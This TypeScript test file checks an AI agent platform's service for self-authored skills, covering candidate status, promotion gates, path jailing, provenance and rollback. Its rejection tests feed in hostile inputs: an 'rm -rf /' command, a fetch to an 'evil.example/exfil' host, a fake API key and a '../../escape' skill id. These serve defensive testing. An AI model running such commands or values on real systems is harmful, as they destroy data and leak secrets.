import fsSync from "node:fs";
import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { afterEach, describe, expect, it, vi } from "vitest";
import { Storage } from "@goatcitadel/storage";
import type { SkillLifecycleRecord } from "@goatcitadel/contracts";
import { SkillMutationService, type SkillMutationLifecycleStore } from "./skill-mutation-service.js";
import { __internal } from "./capability-system-service.js";
import { SKILL_CONTENT_INTEGRITY_LIMITS } from "./skill-content-integrity.js";

const { isSkillCallable } = __internal;

interface Harness {
  rootDir: string;
  storage: Storage;
  service: SkillMutationService;
}

const harnesses: Harness[] = [];

afterEach(() => {
  for (const harness of harnesses.splice(0)) {
    harness.storage.close();
    fsSync.rmSync(harness.rootDir, { recursive: true, force: true });
  }
});

function createHarness(): Harness {
  const rootDir = fsSync.mkdtempSync(path.join(os.tmpdir(), "gc-skill-mutation-"));
  const transcriptsDir = path.join(rootDir, "transcripts");
  const auditDir = path.join(rootDir, "audit");
  fsSync.mkdirSync(transcriptsDir, { recursive: true });
  fsSync.mkdirSync(auditDir, { recursive: true });
  const storage = new Storage({ dbPath: path.join(rootDir, "gateway.sqlite"), transcriptsDir, auditDir });
  const service = new SkillMutationService({ rootDir, skillLifecycle: storage.skillLifecycle });
  const harness: Harness = { rootDir, storage, service };
  harnesses.push(harness);
  return harness;
}

/** In-memory lifecycle store for jail/escape tests that need no DB. */
function createMemoryLifecycleStore(): SkillMutationLifecycleStore & { rows: Map<string, SkillLifecycleRecord> } {
  const rows = new Map<string, SkillLifecycleRecord>();
  return {
    rows,
    find: (skillId) => rows.get(skillId),
    upsert: (input) => {
      rows.set(input.skillId, input);
      return input;
    },
  };
}

function buildSkillMarkdown(body: string, name = "Self Authored Helper"): string {
  return [
    "---",
    `name: ${name}`,
    "description: A self-authored helper that summarizes operator notes into clear bullet points.",
    "---",
    "",
    body,
  ].join("\n");
}

describe("SkillMutationService", () => {
  it("writes a self-authored skill as a non-callable candidate with provenance", async () => {
    const harness = createHarness();
    const result = await harness.service.draftSkillMutation({
      skillMarkdown: buildSkillMarkdown("Summarize the notes."),
      evaluationRunId: "eval-run-1",
      sourceTurnId: "turn-1",
      summary: "summarizer",
    });

    expect(result.skillId).toBe("self-authored-helper");
    expect(result.lifecycle.category).toBe("self_generated");
    expect(result.lifecycle.lifecycleState).toBe("candidate");

    // SAFETY INVARIANT: the single execution chokepoint reports the freshly
    // authored skill as NOT callable while it is a candidate.
    expect(isSkillCallable(result.lifecycle, "enabled")).toBe(false);

    // SKILL.md was written inside the self-skills jail.
    expect(result.skillFilePath.startsWith(harness.service.selfSkillsRoot)).toBe(true);
    expect(fsSync.readFileSync(result.skillFilePath, "utf8")).toContain("Summarize the notes.");

    // Provenance recorded as self_generated with the supplied run/turn ids.
    const provenance = JSON.parse(fsSync.readFileSync(path.join(result.skillDir, "source.json"), "utf8")) as {
      source: string;
      evaluationRunId?: string;
      sourceTurnId?: string;
    };
    expect(provenance).toMatchObject({
      source: "self_generated",
      evaluationRunId: "eval-run-1",
      sourceTurnId: "turn-1",
    });
  });

  it("rejects script-laden and network-laden drafts before writing", async () => {
    const harness = createHarness();
    await expect(
      harness.service.draftSkillMutation({ skillMarkdown: buildSkillMarkdown("Run rm -rf / now.") }),
    ).rejects.toThrow(/high-risk script/i);
    await expect(
      harness.service.draftSkillMutation({
        skillMarkdown: buildSkillMarkdown("fetch('https://evil.example/exfil')"),
      }),
    ).rejects.toThrow(/outbound-network/i);
    // Nothing was written.
    expect(fsSync.existsSync(harness.service.selfSkillsRoot)).toBe(false);
  });

  it("blocks secrets from skill content", async () => {
    const harness = createHarness();
    await expect(
      harness.service.draftSkillMutation({
        skillMarkdown: buildSkillMarkdown("Use api_key=sk-abcdef0123456789abcdef to call the API."),
      }),
    ).rejects.toThrow(/secret/i);
    expect(harness.storage.skillLifecycle.find("self-authored-helper")).toBeUndefined();
  });

  it("blocks path-jail escapes via a crafted skill id", async () => {
    const store = createMemoryLifecycleStore();
    const rootDir = fsSync.mkdtempSync(path.join(os.tmpdir(), "gc-skill-jail-"));
    const service = new SkillMutationService({ rootDir, skillLifecycle: store });
    try {
      await expect(
        service.draftSkillMutation({
          skillMarkdown: buildSkillMarkdown("Body"),
          skillId: "../../escape",
        }),
      ).rejects.toThrow();
      expect(store.rows.size).toBe(0);
    } finally {
      fsSync.rmSync(rootDir, { recursive: true, force: true });
    }
  });

  it("promotes a candidate to a callable approved state only on demand", async () => {
    const harness = createHarness();
    const result = await harness.service.draftSkillMutation({ skillMarkdown: buildSkillMarkdown("Body") });
    expect(isSkillCallable(result.lifecycle, "enabled")).toBe(false);

    const promoted = harness.service.promoteSelfAuthoredSkill(result.skillId);
    expect(promoted.lifecycleState).toBe("approved");
    // SAFETY INVARIANT: only after the recorded promotion does the chokepoint
    // report the skill as callable.
    expect(isSkillCallable(promoted, "enabled")).toBe(true);
  });

  it("refuses to promote a non-self-authored skill", () => {
    const harness = createHarness();
    harness.storage.skillLifecycle.upsert({
      skillId: "imported-thing",
      category: "community_imported",
      lifecycleState: "candidate",
      trustLabel: "Imported",
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
    });
    expect(() => harness.service.promoteSelfAuthoredSkill("imported-thing")).toThrow(/non-self-authored/i);
  });

  it("reverts a brand-new authored skill: removes the file and tombstones the lifecycle", async () => {
    const harness = createHarness();
    const result = await harness.service.draftSkillMutation({ skillMarkdown: buildSkillMarkdown("Body") });
    harness.service.promoteSelfAuthoredSkill(result.skillId);
    expect(fsSync.existsSync(result.skillFilePath)).toBe(true);

    harness.service.restoreSnapshotSync(result.snapshot);

    expect(fsSync.existsSync(result.skillFilePath)).toBe(false);
    const reverted = harness.storage.skillLifecycle.find(result.skillId);
    expect(reverted?.lifecycleState).toBe("revoked");
    // SAFETY INVARIANT: a reverted skill is never callable.
    expect(reverted ? isSkillCallable(reverted, "enabled") : false).toBe(false);
  });

  it("refuses to restore a snapshot with an empty skillId and does not wipe the jail root", async () => {
    const harness = createHarness();
    // Seed a real authored skill so we can prove it survives a malformed restore.
    const real = await harness.service.draftSkillMutation({ skillMarkdown: buildSkillMarkdown("Keep me.") });
    expect(fsSync.existsSync(real.skillFilePath)).toBe(true);

    // A deserialized snapshot with a blank skillId would resolve to the jail ROOT;
    // the "did-not-exist" branch would then rm -rf the whole self-skills dir.
    const malformed = {
      skillId: "   ",
      skillFilePath: path.join(harness.service.selfSkillsRoot, "SKILL.md"),
      existed: false,
      capturedAt: new Date().toISOString(),
    } as unknown as Parameters<typeof harness.service.restoreSnapshotSync>[0];

    expect(() => harness.service.restoreSnapshotSync(malformed)).toThrow(/invalid \(empty\) skillId/i);
    await expect(harness.service.restoreSnapshot(malformed)).rejects.toThrow(/invalid \(empty\) skillId/i);

    // The jail root and the real skill are untouched.
    expect(fsSync.existsSync(harness.service.selfSkillsRoot)).toBe(true);
    expect(fsSync.existsSync(real.skillFilePath)).toBe(true);
  });

  it("refuses to restore a snapshot whose skillId is not a string", async () => {
    const harness = createHarness();
    const malformed = {
      skillId: undefined,
      existed: false,
      capturedAt: new Date().toISOString(),
    } as unknown as Parameters<typeof harness.service.restoreSnapshotSync>[0];
    expect(() => harness.service.restoreSnapshotSync(malformed)).toThrow(/invalid \(empty\) skillId/i);
  });

  it("reverts an overwrite back to the prior SKILL.md bytes and lifecycle", async () => {
    const harness = createHarness();
    const first = await harness.service.draftSkillMutation({
      skillMarkdown: buildSkillMarkdown("Original body content."),
    });
    harness.service.promoteSelfAuthoredSkill(first.skillId);

    const second = await harness.service.draftSkillMutation({
      skillMarkdown: buildSkillMarkdown("Replacement body content."),
    });
    expect(second.snapshot.existed).toBe(true);
    expect(fsSync.readFileSync(second.skillFilePath, "utf8")).toContain("Replacement body content.");

    harness.service.restoreSnapshotSync(second.snapshot);

    expect(fsSync.readFileSync(second.skillFilePath, "utf8")).toContain("Original body content.");
    const restored = harness.storage.skillLifecycle.find(first.skillId);
    // The prior lifecycle (approved, from the first promote) is restored verbatim.
    expect(restored?.lifecycleState).toBe("approved");
  });

  it("returns an already-committed durable draft by execution identity without rewriting or demoting it", async () => {
    const harness = createHarness();
    const identity = "chat-post-commit-child-replay";
    const skillId = "background-review-replay-safe";
    const first = await harness.service.draftSkillMutation({
      skillId,
      evaluationRunId: identity,
      sourceTurnId: "turn-replay",
      skillMarkdown: buildSkillMarkdown("Original durable candidate."),
    });
    harness.service.promoteSelfAuthoredSkill(first.skillId);

    const replay = await harness.service.draftSkillMutation({
      skillId,
      evaluationRunId: identity,
      sourceTurnId: "turn-replay",
      skillMarkdown: buildSkillMarkdown("Different provider replay output that must not overwrite."),
    });

    expect(replay.replayed).toBe(true);
    expect(fsSync.readFileSync(first.skillFilePath, "utf8")).toContain("Original durable candidate.");
    expect(fsSync.readFileSync(first.skillFilePath, "utf8")).not.toContain("Different provider replay output");
    expect(harness.storage.skillLifecycle.find(skillId)?.lifecycleState).toBe("approved");
  });

  it("rolls back the first artifact when the companion provenance write fails", async () => {
    const harness = createHarness();
    const writeFile = fs.writeFile.bind(fs);
    let writeCount = 0;
    const writeSpy = vi.spyOn(fs, "writeFile").mockImplementation(async (...args) => {
      writeCount += 1;
      if (writeCount === 2) {
        throw new Error("simulated source.json write failure");
      }
      return writeFile(...args);
    });

    await expect(
      harness.service.draftSkillMutation({ skillMarkdown: buildSkillMarkdown("Atomic file pair.") }),
    ).rejects.toThrow("simulated source.json write failure");

    writeSpy.mockRestore();
    const skillDir = path.join(harness.service.selfSkillsRoot, "self-authored-helper");
    expect(fsSync.existsSync(path.join(skillDir, "SKILL.md"))).toBe(false);
    expect(fsSync.existsSync(path.join(skillDir, "source.json"))).toBe(false);
  });

  it("rolls back both artifacts when lifecycle persistence fails", async () => {
    const harness = createHarness();
    const upsertSpy = vi.spyOn(harness.storage.skillLifecycle, "upsert").mockImplementation(() => {
      throw new Error("simulated lifecycle failure");
    });

    await expect(
      harness.service.draftSkillMutation({ skillMarkdown: buildSkillMarkdown("Rollback lifecycle failure.") }),
    ).rejects.toThrow("simulated lifecycle failure");

    upsertSpy.mockRestore();
    const skillDir = path.join(harness.service.selfSkillsRoot, "self-authored-helper");
    expect(fsSync.existsSync(path.join(skillDir, "SKILL.md"))).toBe(false);
    expect(fsSync.existsSync(path.join(skillDir, "source.json"))).toBe(false);
  });

  it("rolls back the synchronous public path when its companion write fails", () => {
    const harness = createHarness();
    const writeFileSync = fsSync.writeFileSync.bind(fsSync);
    let writeCount = 0;
    const writeSpy = vi.spyOn(fsSync, "writeFileSync").mockImplementation((file, data, options) => {
      writeCount += 1;
      if (writeCount === 2) {
        throw new Error("simulated sync source.json failure");
      }
      return writeFileSync(file, data, options);
    });

    expect(() =>
      harness.service.applySkillMutationSync({ skillMarkdown: buildSkillMarkdown("Sync rollback.") }),
    ).toThrow("simulated sync source.json failure");

    writeSpy.mockRestore();
    const skillDir = path.join(harness.service.selfSkillsRoot, "self-authored-helper");
    expect(fsSync.existsSync(path.join(skillDir, "SKILL.md"))).toBe(false);
    expect(fsSync.existsSync(path.join(skillDir, "source.json"))).toBe(false);
  });

  it("reports both the mutation and rollback failures for manual reconciliation", async () => {
    const harness = createHarness();
    const writeFile = fs.writeFile.bind(fs);
    let writeCount = 0;
    const writeSpy = vi.spyOn(fs, "writeFile").mockImplementation(async (...args) => {
      writeCount += 1;
      if (writeCount === 2) {
        throw new Error("simulated mutation failure");
      }
      return writeFile(...args);
    });
    const rmSpy = vi.spyOn(fs, "rm").mockRejectedValue(new Error("simulated rollback failure"));

    const failure = await harness.service
      .draftSkillMutation({ skillMarkdown: buildSkillMarkdown("Rollback failure evidence.") })
      .catch((error: unknown) => error);

    writeSpy.mockRestore();
    rmSpy.mockRestore();
    expect(failure).toBeInstanceOf(AggregateError);
    expect((failure as AggregateError).message).toMatch(/manual reconciliation is required/i);
    expect((failure as AggregateError).errors).toHaveLength(2);
  });

  it("creates or verifies a persisted durable plan without overwriting conflicting files", () => {
    const harness = createHarness();
    const prepared = harness.service.prepareDurableSkillMutation({
      skillId: "background-review-plan",
      evaluationRunId: "effect-plan-1",
      sourceTurnId: "turn-plan-1",
      skillMarkdown: buildSkillMarkdown("Persisted exact plan.", "Background Review Plan"),
    });

    harness.service.applyPreparedSkillMutationFilesSync(prepared);
    expect(harness.storage.skillLifecycle.find(prepared.skillId)).toBeUndefined();
    harness.service.applyPreparedSkillMutationFilesSync(prepared);

    const skillFilePath = path.join(harness.service.selfSkillsRoot, prepared.skillId, "SKILL.md");
    const sourceJsonPath = path.join(harness.service.selfSkillsRoot, prepared.skillId, "source.json");
    fsSync.rmSync(sourceJsonPath);
    harness.service.applyPreparedSkillMutationFilesSync(prepared);
    expect(JSON.parse(fsSync.readFileSync(sourceJsonPath, "utf8"))).toMatchObject({
      evaluationRunId: "effect-plan-1",
    });

    fsSync.writeFileSync(skillFilePath, buildSkillMarkdown("Operator edit.", "Background Review Plan"), "utf8");
    expect(() => harness.service.applyPreparedSkillMutationFilesSync(prepared)).toThrow(/conflict/i);
    expect(fsSync.readFileSync(skillFilePath, "utf8")).toContain("Operator edit.");
    expect(harness.storage.skillLifecycle.find(prepared.skillId)).toBeUndefined();
  });

  it("bounds existing source.json snapshots before reading rollback bytes", () => {
    const harness = createHarness();
    const skillDir = path.join(harness.service.selfSkillsRoot, "oversized-provenance");
    fsSync.mkdirSync(skillDir, { recursive: true });
    fsSync.writeFileSync(path.join(skillDir, "SKILL.md"), buildSkillMarkdown("Existing skill bytes."), "utf8");
    const sourceJsonPath = path.join(skillDir, "source.json");
    fsSync.writeFileSync(sourceJsonPath, "");
    fsSync.truncateSync(sourceJsonPath, SKILL_CONTENT_INTEGRITY_LIMITS.maxSourceManifestBytes + 1);

    expect(() => harness.service.captureSnapshotFor({ skillId: "oversized-provenance" })).toThrow(
      `exceeds ${SKILL_CONTENT_INTEGRITY_LIMITS.maxSourceManifestBytes} bytes`,
    );
  });

  it("does not publish a partial durable artifact when the exclusive write creates then throws", () => {
    const harness = createHarness();
    const prepared = harness.service.prepareDurableSkillMutation({
      skillId: "background-review-partial",
      evaluationRunId: "effect-plan-partial",
      skillMarkdown: buildSkillMarkdown("Complete planned bytes.", "Background Review Partial"),
    });
    const writeFileSync = fsSync.writeFileSync.bind(fsSync);
    let injected = false;
    const writeSpy = vi.spyOn(fsSync, "writeFileSync").mockImplementation((file, data, options) => {
      if (!injected) {
        injected = true;
        writeFileSync(file, String(data).slice(0, 12), options);
        throw new Error("simulated create-then-throw");
      }
      return writeFileSync(file, data, options);
    });

    expect(() => harness.service.applyPreparedSkillMutationFilesSync(prepared)).toThrow("simulated create-then-throw");

    writeSpy.mockRestore();
    const skillDir = path.join(harness.service.selfSkillsRoot, prepared.skillId);
    expect(fsSync.existsSync(path.join(skillDir, "SKILL.md"))).toBe(false);
    expect(fsSync.existsSync(path.join(skillDir, "source.json"))).toBe(false);
    expect(fsSync.existsSync(skillDir) ? fsSync.readdirSync(skillDir) : []).toEqual([]);
  });

  it("keeps the exact published target valid when post-link temp cleanup fails", () => {
    const harness = createHarness();
    const prepared = harness.service.prepareDurableSkillMutation({
      skillId: "background-review-temp-cleanup",
      evaluationRunId: "effect-temp-cleanup",
      skillMarkdown: buildSkillMarkdown("Published before cleanup.", "Background Review Temp Cleanup"),
    });
    const rmSync = fsSync.rmSync.bind(fsSync);
    let injected = false;
    const rmSpy = vi.spyOn(fsSync, "rmSync").mockImplementation((target, options) => {
      if (!injected && String(target).endsWith(".tmp")) {
        injected = true;
        throw new Error("simulated post-link temp cleanup failure");
      }
      return rmSync(target, options);
    });

    expect(() => harness.service.applyPreparedSkillMutationFilesSync(prepared)).not.toThrow();

    rmSpy.mockRestore();
    const skillFilePath = path.join(harness.service.selfSkillsRoot, prepared.skillId, "SKILL.md");
    expect(fsSync.readFileSync(skillFilePath, "utf8")).toBe(prepared.skillMarkdown);
    expect(harness.storage.skillLifecycle.find(prepared.skillId)).toBeUndefined();
  });
});
